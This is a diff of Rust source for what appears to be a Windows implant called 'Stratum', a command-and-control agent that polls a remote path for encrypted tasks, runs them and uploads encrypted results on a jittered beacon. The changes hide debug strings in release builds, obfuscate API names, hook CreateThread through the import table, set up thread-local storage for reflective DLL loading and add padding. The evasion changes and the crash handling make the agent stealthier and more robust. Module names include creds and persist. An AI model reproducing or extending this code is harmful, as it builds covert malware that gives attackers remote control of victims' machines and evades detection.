@@ -8,21 +8,37 @@
 pub mod creds;
 pub mod crypto;
 pub mod crypto_compat;
+pub mod dynapi;
 pub mod exec;
 pub mod hw;
 pub mod inlinexec;
-pub mod loader;
 pub mod obfs;
 pub mod persist;
 pub mod protocol;
 pub mod sysinfo;
 pub mod transport;
 
+#[cfg(stratum_debug)]
+#[macro_export]
+macro_rules! dlog {
+    ($tag:literal, $msg:literal) => { eprintln!(concat!("[", $tag, "] ", $msg)); };
+    ($tag:literal, $fmt:literal, $($arg:tt)*) => { eprintln!(concat!("[", $tag, "] ", $fmt), $($arg)*); };
+}
+#[cfg(not(stratum_debug))]
+#[macro_export]
+macro_rules! dlog {
+    ($tag:literal, $msg:literal) => {};
+    ($tag:literal, $fmt:literal, $($arg:tt)*) => {};
+}
+
 #[cfg(stratum_staged_enc)]
 pub mod staged;
 
 #[cfg(stratum_stageless_enc)]
 pub mod stageless_enc;
+
+#[used]
+static PADDING: &[u8] = include_bytes!("../resources/padding.txt");
 
 use std::sync::Arc;
 use std::time::Duration;
@@ -88,8 +104,8 @@ unsafe impl Send for TrampolineArgs {}
 
 #[cfg(windows)]
 unsafe extern "system" fn tls_trampoline(param: *mut std::ffi::c_void) -> u32 {
-    extern "system" { fn OutputDebugStringA(s: *const u8); }
-    OutputDebugStringA(b"[CT] trampoline entered\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline entered\0".as_ptr()); }
 
     // Recover args from heap-allocated box, drop it after reading.
     let args = Box::from_raw(param as *mut TrampolineArgs);
@@ -106,7 +122,9 @@ unsafe extern "system" fn tls_trampoline(param: *mut std::ffi::c_void) -> u32 {
     if !addr_of_index.is_null() && template_sz > 0 {
         let tls_slot = *addr_of_index as usize;
         // Log slot and template_sz for diagnostics
+        #[cfg(stratum_debug)]
         {
+            extern "system" { fn OutputDebugStringA(s: *const u8); }
             let mut msg = *b"[CT] trampoline slot=???? sz=????????\0";
             let s = tls_slot;
             msg[20] = b'0' + ((s / 1000) % 10) as u8;
@@ -126,13 +144,17 @@ unsafe extern "system" fn tls_trampoline(param: *mut std::ffi::c_void) -> u32 {
         }
         // Safety check: slot must be valid (< 1088 = Win32 TLS limit) and non-zero
         if tls_slot == 0 || tls_slot >= 1088 {
-            let mut msg = *b"[CT] trampoline bad slot=????\0";
-            let s = tls_slot;
-            msg[24] = b'0' + ((s / 1000) % 10) as u8;
-            msg[25] = b'0' + ((s / 100)  % 10) as u8;
-            msg[26] = b'0' + ((s / 10)   % 10) as u8;
-            msg[27] = b'0' + (s           % 10) as u8;
-            OutputDebugStringA(msg.as_ptr());
+            #[cfg(stratum_debug)]
+            {
+                extern "system" { fn OutputDebugStringA(s: *const u8); }
+                let mut msg = *b"[CT] trampoline bad slot=????\0";
+                let s = tls_slot;
+                msg[24] = b'0' + ((s / 1000) % 10) as u8;
+                msg[25] = b'0' + ((s / 100)  % 10) as u8;
+                msg[26] = b'0' + ((s / 10)   % 10) as u8;
+                msg[27] = b'0' + (s           % 10) as u8;
+                OutputDebugStringA(msg.as_ptr());
+            }
         } else {
             // Use HeapAlloc directly — bypasses the Rust allocator runtime entirely.
             // std::alloc in a newly-created thread (before TLS is set up) can corrupt
@@ -152,17 +174,21 @@ unsafe extern "system" fn tls_trampoline(param: *mut std::ffi::c_void) -> u32 {
             if tls_array != 0 {
                 let slot_ptr = (tls_array + tls_slot * 8) as *mut usize;
                 *slot_ptr = tls_block as usize;
-                OutputDebugStringA(b"[CT] trampoline TLS ok\0".as_ptr());
+                #[cfg(stratum_debug)]
+                { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline TLS ok\0".as_ptr()); }
             } else {
-                OutputDebugStringA(b"[CT] trampoline tlsp still null\0".as_ptr());
+                #[cfg(stratum_debug)]
+                { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline tlsp still null\0".as_ptr()); }
             }
         }
         }
     }
 
-    OutputDebugStringA(b"[CT] trampoline calling real_func\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline calling real_func\0".as_ptr()); }
     let ret = real_func(real_param);
-    OutputDebugStringA(b"[CT] trampoline real_func returned\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline real_func returned\0".as_ptr()); }
     ret
 }
 
@@ -183,9 +209,9 @@ pub unsafe extern "system" fn StratumCreateThread(
     extern "system" {
         fn GetModuleHandleA(name: *const u8) -> *mut std::ffi::c_void;
         fn GetProcAddress(module: *mut std::ffi::c_void, name: *const u8) -> *const std::ffi::c_void;
-        fn OutputDebugStringA(s: *const u8);
     }
-    OutputDebugStringA(b"[CT] StratumCreateThread called\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] StratumCreateThread called\0".as_ptr()); }
 
     // Resolve the REAL CreateThread directly from kernel32 — NOT via our IAT
     // (which is now patched to point here, causing infinite recursion otherwise).
@@ -194,14 +220,18 @@ pub unsafe extern "system" fn StratumCreateThread(
         unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
         *mut std::ffi::c_void, u32, *mut u32,
     ) -> *mut std::ffi::c_void;
-    let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
+    let k32_name = sb!("kernel32.dll");
+    let k32 = GetModuleHandleA(k32_name.as_ptr());
     if k32.is_null() {
-        OutputDebugStringA(b"[CT] k32 null\0".as_ptr());
+        #[cfg(stratum_debug)]
+        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] k32 null\0".as_ptr()); }
         return std::ptr::null_mut();
     }
-    let p_ct = GetProcAddress(k32, b"CreateThread\0".as_ptr());
+    let ct_name = sb!("CreateThread");
+    let p_ct = GetProcAddress(k32, ct_name.as_ptr());
     if p_ct.is_null() {
-        OutputDebugStringA(b"[CT] CreateThread not found\0".as_ptr());
+        #[cfg(stratum_debug)]
+        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] CreateThread not found\0".as_ptr()); }
         return std::ptr::null_mut();
     }
     let real_create_thread: FnCreateThread = std::mem::transmute(p_ct);
@@ -223,9 +253,11 @@ pub unsafe extern "system" fn StratumCreateThread(
     if hthread.is_null() {
         // CreateThread failed — free the args to avoid a leak.
         drop(Box::from_raw(args_ptr as *mut TrampolineArgs));
-        OutputDebugStringA(b"[CT] CreateThread returned null\0".as_ptr());
+        #[cfg(stratum_debug)]
+        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] CreateThread returned null\0".as_ptr()); }
     } else {
-        OutputDebugStringA(b"[CT] thread started\0".as_ptr());
+        #[cfg(stratum_debug)]
+        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] thread started\0".as_ptr()); }
     }
     hthread
 }
@@ -272,8 +304,8 @@ pub unsafe extern "system" fn StratumCrtInit() {
         static __xc_a: unsafe extern "C" fn();
         static __xc_z: unsafe extern "C" fn();
     }
-    extern "system" { fn OutputDebugStringA(s: *const u8); }
-    OutputDebugStringA(b"[CI] StratumCrtInit entered\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CI] StratumCrtInit entered\0".as_ptr()); }
 
     let mut p = &__xi_a as *const _ as *const usize;
     let end   = &__xi_z as *const _ as *const usize;
@@ -282,7 +314,8 @@ pub unsafe extern "system" fn StratumCrtInit() {
         if fp != 0 { let f: unsafe extern "C" fn() = core::mem::transmute(fp); f(); }
         p = p.add(1);
     }
-    OutputDebugStringA(b"[CI] XI inits done\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CI] XI inits done\0".as_ptr()); }
 
     let mut p = &__xc_a as *const _ as *const usize;
     let end   = &__xc_z as *const _ as *const usize;
@@ -291,7 +324,8 @@ pub unsafe extern "system" fn StratumCrtInit() {
         if fp != 0 { let f: unsafe extern "C" fn() = core::mem::transmute(fp); f(); }
         p = p.add(1);
     }
-    OutputDebugStringA(b"[CI] XC inits done\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CI] XC inits done\0".as_ptr()); }
 }
 
 #[cfg(windows)]
@@ -309,10 +343,10 @@ pub unsafe extern "system" fn StratumRun(
             tid:   *mut u32,
         ) -> *mut std::ffi::c_void;
         fn Sleep(ms: u32);
-        fn OutputDebugStringA(s: *const u8);
     }
 
-    OutputDebugStringA(b"[SR] entered\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] entered\0".as_ptr()); }
 
     // Publish TLS info for StratumCreateThread so it can inject TLS into every
     // new thread spawned by reqwest/tokio/std (they all go through our IAT hook).
@@ -326,15 +360,17 @@ pub unsafe extern "system" fn StratumRun(
             TLS_ADDR_OF_INDEX.store(aoi, SeqCst);
             TLS_TEMPLATE_VA.store(tva, SeqCst);
             TLS_TEMPLATE_SZ.store(tsz, SeqCst);
-            OutputDebugStringA(b"[SR] TLS info published\0".as_ptr());
+            #[cfg(stratum_debug)]
+            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS info published\0".as_ptr()); }
         } else {
-            OutputDebugStringA(b"[SR] no TLS info block\0".as_ptr());
+            #[cfg(stratum_debug)]
+            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] no TLS info block\0".as_ptr()); }
         }
     }
 
     unsafe extern "system" fn agent_thread_entry(param: *mut std::ffi::c_void) -> u32 {
-        extern "system" { fn OutputDebugStringA(s: *const u8); }
-        OutputDebugStringA(b"[SR] agent_thread_entry started\0".as_ptr());
+        #[cfg(stratum_debug)]
+        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] agent_thread_entry started\0".as_ptr()); }
 
         // Initialise per-thread TLS storage before any Rust thread-local access.
         // Windows does not call DLL_THREAD_ATTACH for reflectively loaded DLLs.
@@ -354,13 +390,15 @@ pub unsafe extern "system" fn StratumRun(
             let addr_of_index    = *blk.add(0) as *const u32;
             let _tls_template_va = *blk.add(1) as *const u8; // not used — zero-init only
             let tls_template_sz  = *blk.add(2);
-            OutputDebugStringA(b"[SR] TLS: addr_of_index ok\0".as_ptr());
+            #[cfg(stratum_debug)]
+            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: addr_of_index ok\0".as_ptr()); }
             if !addr_of_index.is_null() && tls_template_sz > 0 {
                 let tls_slot = *addr_of_index as usize;
                 // log the slot index
-                extern "system" { fn OutputDebugStringA(s: *const u8); }
-                // simple slot number log via stack buffer
+                #[cfg(stratum_debug)]
                 {
+                    extern "system" { fn OutputDebugStringA(s: *const u8); }
+                    // simple slot number log via stack buffer
                     let mut buf = [0u8; 32];
                     buf[0] = b'['; buf[1] = b'S'; buf[2] = b'R'; buf[3] = b']';
                     buf[4] = b' '; buf[5] = b'T'; buf[6] = b'L'; buf[7] = b'S';
@@ -379,7 +417,8 @@ pub unsafe extern "system" fn StratumRun(
                 let heap = GetProcessHeap();
                 let tls_block = HeapAlloc(heap, 0x08 /* HEAP_ZERO_MEMORY */, tls_template_sz);
                 if !tls_block.is_null() {
-                    OutputDebugStringA(b"[SR] TLS: HeapAlloc ok (zero, no template copy)\0".as_ptr());
+                    #[cfg(stratum_debug)]
+                    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: HeapAlloc ok (zero, no template copy)\0".as_ptr()); }
                     // Do NOT copy the template — leave the block zeroed.
                     // Rust thread_local! vars initialise lazily from a zero block.
                     if tls_slot < 64 {
@@ -389,9 +428,11 @@ pub unsafe extern "system" fn StratumRun(
                             out(reg) tls_slots_base,
                             options(nostack, pure, nomem)
                         );
-                        OutputDebugStringA(b"[SR] TLS: writing standard slot\0".as_ptr());
+                        #[cfg(stratum_debug)]
+                        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: writing standard slot\0".as_ptr()); }
                         *((tls_slots_base + tls_slot * 8) as *mut usize) = tls_block as usize;
-                        OutputDebugStringA(b"[SR] TLS: standard slot written\0".as_ptr());
+                        #[cfg(stratum_debug)]
+                        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: standard slot written\0".as_ptr()); }
                     } else {
                         let exp_slots_base: usize;
                         core::arch::asm!(
@@ -400,36 +441,46 @@ pub unsafe extern "system" fn StratumRun(
                             options(nostack, pure, nomem)
                         );
                         if exp_slots_base != 0 {
-                            OutputDebugStringA(b"[SR] TLS: writing expansion slot\0".as_ptr());
+                            #[cfg(stratum_debug)]
+                            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: writing expansion slot\0".as_ptr()); }
                             *((exp_slots_base + (tls_slot - 64) * 8) as *mut usize) = tls_block as usize;
-                            OutputDebugStringA(b"[SR] TLS: expansion slot written\0".as_ptr());
+                            #[cfg(stratum_debug)]
+                            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: expansion slot written\0".as_ptr()); }
                         } else {
-                            OutputDebugStringA(b"[SR] TLS: expansion slots ptr is null!\0".as_ptr());
+                            #[cfg(stratum_debug)]
+                            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: expansion slots ptr is null!\0".as_ptr()); }
                         }
                     }
                 } else {
-                    OutputDebugStringA(b"[SR] TLS: HeapAlloc FAILED\0".as_ptr());
+                    #[cfg(stratum_debug)]
+                    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: HeapAlloc FAILED\0".as_ptr()); }
                 }
             } else {
-                OutputDebugStringA(b"[SR] TLS: addr_of_index null or sz=0\0".as_ptr());
+                #[cfg(stratum_debug)]
+                { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: addr_of_index null or sz=0\0".as_ptr()); }
             }
         } else {
-            OutputDebugStringA(b"[SR] TLS: no info block (skipped)\0".as_ptr());
+            #[cfg(stratum_debug)]
+            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: no info block (skipped)\0".as_ptr()); }
         }
-        OutputDebugStringA(b"[SR] TLS init done, calling agent_loop\0".as_ptr());
+        #[cfg(stratum_debug)]
+        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS init done, calling agent_loop\0".as_ptr()); }
 
         agent_loop();
-        OutputDebugStringA(b"[SR] agent_loop returned\0".as_ptr());
+        #[cfg(stratum_debug)]
+        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] agent_loop returned\0".as_ptr()); }
         0
     }
 
-    OutputDebugStringA(b"[SR] spawning agent thread\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] spawning agent thread\0".as_ptr()); }
     let h = CreateThread(
         std::ptr::null_mut(), 0,
         agent_thread_entry, tls_info_block,
         0, std::ptr::null_mut(),
     );
-    OutputDebugStringA(b"[SR] agent thread spawned\0".as_ptr());
+    #[cfg(stratum_debug)]
+    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] agent thread spawned\0".as_ptr()); }
     AGENT_THREAD_HANDLE.store(h as usize, std::sync::atomic::Ordering::SeqCst);
 
     let mut tick: u32 = 0;
@@ -437,9 +488,13 @@ pub unsafe extern "system" fn StratumRun(
         Sleep(60_000);
         tick += 1;
         // Log every minute so we know StratumRun loop is still alive
-        if tick == 1 { OutputDebugStringA(b"[SR] loop tick 1m\0".as_ptr()); }
-        else if tick == 2 { OutputDebugStringA(b"[SR] loop tick 2m\0".as_ptr()); }
-        else if tick == 5 { OutputDebugStringA(b"[SR] loop tick 5m\0".as_ptr()); }
+        #[cfg(stratum_debug)]
+        {
+            extern "system" { fn OutputDebugStringA(s: *const u8); }
+            if tick == 1 { OutputDebugStringA(b"[SR] loop tick 1m\0".as_ptr()); }
+            else if tick == 2 { OutputDebugStringA(b"[SR] loop tick 2m\0".as_ptr()); }
+            else if tick == 5 { OutputDebugStringA(b"[SR] loop tick 5m\0".as_ptr()); }
+        }
     }
 }
 
@@ -452,42 +507,51 @@ pub extern "system" fn DllRegisterServer() -> i32 {
 
 // ── main entry point ──────────────────────────────────────────────────────────
 
+#[cfg(windows)]
+fn _exit_if_dll() {
+    unsafe { crate::dynapi::exit_process(0); }
+}
+
+#[cfg(not(windows))]
+fn _exit_if_dll() {}
+
 pub fn agent_loop() {
-    #[cfg(windows)]
+    #[cfg(all(windows, stratum_debug))]
     unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] agent_loop entered\0".as_ptr()); }
 
     #[cfg(stratum_staged_enc)]
     {
-        #[cfg(windows)]
+        #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] mode: staged-enc\0".as_ptr()); }
         staged::run();
+        _exit_if_dll();
         return;
     }
 
     #[cfg(stratum_stageless_enc)]
-    { stageless_enc::run(); return; }
+    { stageless_enc::run(); _exit_if_dll(); return; }
 
     #[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
     {
-        #[cfg(windows)]
+        #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] mode: stageless-plain\0".as_ptr()); }
 
         let base_sleep: u64 = BASE_SLEEP_S.parse().unwrap_or(60);
         let jitter_pct: u64 = JITTER_PCT_S.parse().unwrap_or(20);
 
-        #[cfg(windows)]
+        #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] decode_pem\0".as_ptr()); }
         let pem = match decode_pem(PUB_KEY_B64) {
             Some(p) => p,
             None    => return,
         };
-        #[cfg(windows)]
+        #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] load_public_key\0".as_ptr()); }
         let pub_key = match crypto::load_public_key(&pem) {
             Ok(k)  => k,
             Err(_) => return,
         };
-        #[cfg(windows)]
+        #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] session_key\0".as_ptr()); }
         let session_key: [u8; 32] = {
             let xored = hex::decode(SESSION_KEY_XOR).unwrap_or_default();
@@ -498,21 +562,21 @@ pub fn agent_loop() {
             k
         };
 
-        #[cfg(windows)]
+        #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] new_transport\0".as_ptr()); }
         let transport = transport::new_transport();
-        #[cfg(windows)]
+        #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] new_transport done\0".as_ptr()); }
         let state = exec::AgentState::new(
             base_sleep, jitter_pct, FOLDER_PATH, BLOB_PATH, INPUT_FILE, OUTPUT_FILE,
         );
-        #[cfg(windows)]
+        #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] AgentInfo\0".as_ptr()); }
         let info = sysinfo::AgentInfo::collect(STUN_IP);
         let start_cwd = std::env::current_dir()
             .map(|p| p.display().to_string())
             .unwrap_or_default();
-        #[cfg(windows)]
+        #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] run_loop\0".as_ptr()); }
         run_loop(
             &info, &start_cwd, &pub_key, &session_key, &transport, &state,
@@ -539,14 +603,16 @@ pub(crate) fn run_loop(
     win_start:   &str,
     win_end:     &str,
 ) {
-    #[cfg(all(windows, stratum_debug))]
+    #[cfg(stratum_debug)]
     macro_rules! rl_log {
-        ($s:literal) => { unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(concat!("[RL] ", $s, "\0").as_ptr()); } }
+        ($s:literal) => { eprintln!(concat!("[RL] ", $s)); };
+        ($fmt:literal, $($arg:tt)*) => { eprintln!(concat!("[RL] ", $fmt), $($arg)*); };
     }
-    #[cfg(all(not(windows), stratum_debug))]
-    macro_rules! rl_log { ($s:literal) => { eprintln!("[RL] {}", $s); } }
     #[cfg(not(stratum_debug))]
-    macro_rules! rl_log { ($s:literal) => {}; }
+    macro_rules! rl_log {
+        ($s:literal) => {};
+        ($fmt:literal, $($arg:tt)*) => {};
+    }
 
     rl_log!("loop start");
     loop {
@@ -583,23 +649,12 @@ pub(crate) fn run_loop(
 
         rl_log!("downloading input");
         let input_path = format!("{}{}", folder, input_f);
-        #[cfg(windows)]
-        unsafe {
-            extern "system" { fn OutputDebugStringA(s: *const u8); }
-            let msg = format!("[RL] input_path={}\0", input_path);
-            OutputDebugStringA(msg.as_ptr());
-        }
+        rl_log!("input_path={}", input_path);
         let raw = match transport.download(&input_path) {
             Some(b) => b,
             None    => { rl_log!("download=None, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }
         };
-        #[cfg(windows)]
-        unsafe {
-            extern "system" { fn OutputDebugStringA(s: *const u8); }
-            let msg = format!("[RL] raw_len={}\0", raw.len());
-            OutputDebugStringA(msg.as_ptr());
-        }
-        rl_log!("download ok");
+        rl_log!("download ok, raw_len={}", raw.len());
 
         if raw == b"MZ" || raw.is_empty() { rl_log!("raw=MZ/empty, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }
 
@@ -609,14 +664,7 @@ pub(crate) fn run_loop(
             Err(_) => { rl_log!("utf8 err, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }
         };
 
-        #[cfg(windows)]
-        unsafe {
-            extern "system" { fn OutputDebugStringA(s: *const u8); }
-            let preview = raw_str.get(..20.min(raw_str.len())).unwrap_or("");
-            let colon_count = raw_str.chars().filter(|&c| c == ':').count();
-            let msg = format!("[RL] raw_str[:20]={:?} colons={}\0", preview, colon_count);
-            OutputDebugStringA(msg.as_ptr());
-        }
+        rl_log!("raw_str len={} colons={}", raw_str.len(), raw_str.chars().filter(|&c| c == ':').count());
         rl_log!("decrypting command");
         let task = match crypto::decrypt_command(&raw_str, pub_key, session_key) {
             Some(t) => t,
@@ -641,15 +689,29 @@ pub(crate) fn run_loop(
             }
         }
 
-        #[cfg(windows)]
-        unsafe {
-            extern "system" { fn OutputDebugStringA(s: *const u8); }
-            let msg = format!("[RL] task.kind={} task.id={}\0", task.kind, task.id);
-            OutputDebugStringA(msg.as_ptr());
-        }
+        rl_log!("task.kind={} task.id={}", task.kind, task.id);
         rl_log!("dispatching task");
-        match exec::dispatch(&task, state, transport, session_key) {
-            Some(resp) => {
+        let dispatch_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+            exec::dispatch(&task, state, transport, session_key)
+        }));
+        match dispatch_result {
+            Err(panic_info) => {
+                let msg = if let Some(s) = panic_info.downcast_ref::<&str>() {
+                    s.to_string()
+                } else if let Some(s) = panic_info.downcast_ref::<String>() {
+                    s.clone()
+                } else {
+                    "unknown panic".to_string()
+                };
+                rl_log!("PANIC in dispatch: {}", msg);
+                let err_resp = crate::protocol::TaskResponse::ok(&task, format!("[agent] PANIC: {}", msg));
+                if let Some(enc) = crypto::encrypt_response(&err_resp, pub_key) {
+                    let output_path_full = format!("{}{}", folder, output_f);
+                    transport.upload(&output_path_full, enc.as_bytes());
+                }
+                transport.upload(&input_path, b"MZ");
+            }
+            Ok(Some(resp)) => {
                 rl_log!("dispatch ok, encrypting response");
                 match crypto::encrypt_response(&resp, pub_key) {
                     Some(enc) => {
@@ -657,26 +719,20 @@ pub(crate) fn run_loop(
                         let output_path_full = format!("{}{}", folder, output_f);
                         let enc_bytes = enc.as_bytes();
                         let mut up = transport.upload(&output_path_full, enc_bytes);
-                        // Retry up to 2 times on upload failure
                         for attempt in 1..=2 {
                             if up { break; }
-                            rl_log!("output upload retry");
+                            rl_log!("output upload retry {}", attempt);
                             std::thread::sleep(Duration::from_secs(2 * attempt));
                             up = transport.upload(&output_path_full, enc_bytes);
                         }
-                        #[cfg(windows)]
-                        unsafe {
-                            extern "system" { fn OutputDebugStringA(s: *const u8); }
-                            let msg = format!("[RL] output upload={}\0", up);
-                            OutputDebugStringA(msg.as_ptr());
-                        }
+                        rl_log!("output upload={}", up);
                     }
                     None => { rl_log!("encrypt_response returned None"); }
                 }
                 transport.upload(&input_path, b"MZ");
                 rl_log!("response uploaded");
             }
-            None => {
+            Ok(None) => {
                 rl_log!("dispatch returned None (exit/kill)");
                 transport.upload(&input_path, b"MZ");
                 break;
@@ -688,6 +744,7 @@ pub(crate) fn run_loop(
         rl_log!("jitter_sleep done");
     }
     rl_log!("loop exited");
+    _exit_if_dll();
 }
 
 // ── helpers ───────────────────────────────────────────────────────────────────
@@ -700,11 +757,11 @@ fn build_heartbeat(
     seq:       u64,
     next_hb_at: u64,
 ) -> String {
-    #[cfg(windows)]
+    #[cfg(all(windows, stratum_debug))]
     macro_rules! bh_log {
         ($s:literal) => { unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(concat!("[BH] ", $s, "\0").as_ptr()); } }
     }
-    #[cfg(not(windows))]
+    #[cfg(not(all(windows, stratum_debug)))]
     macro_rules! bh_log { ($s:literal) => {} }
 
     bh_log!("hw::expand");
